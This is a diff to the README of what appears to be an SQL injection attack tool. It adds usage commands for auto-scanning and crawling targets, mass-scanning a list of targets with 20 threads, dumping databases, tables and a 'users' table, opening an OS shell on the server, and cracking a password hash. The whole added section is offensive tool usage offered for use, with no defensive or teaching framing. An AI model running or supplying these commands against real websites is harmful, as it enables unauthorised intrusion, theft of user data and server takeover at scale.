@@ -22,3 +22,23 @@ Developer: **gamerif404**
 ```bash
 chmod +x setup.sh
 ./setup.sh
+
+# scan single target auto
+python sqli.py -u "https://target.com/page.php?id=1" --auto
+
+# crawl + auto
+python sqli.py -u "https://target.com" --crawl --auto
+
+# scan massal dari file
+python sqli.py -l targets.txt --auto --threads 20
+
+# dump database
+python sqli.py -u "URL" --dbs
+python sqli.py -u "URL" --tables
+python sqli.py -u "URL" --dump users
+
+# os shell
+python sqli.py -u "URL" --os-shell
+
+# crack hash
+python sqli.py --crack 5f4dcc3b5aa765d61d8327deb882cf99
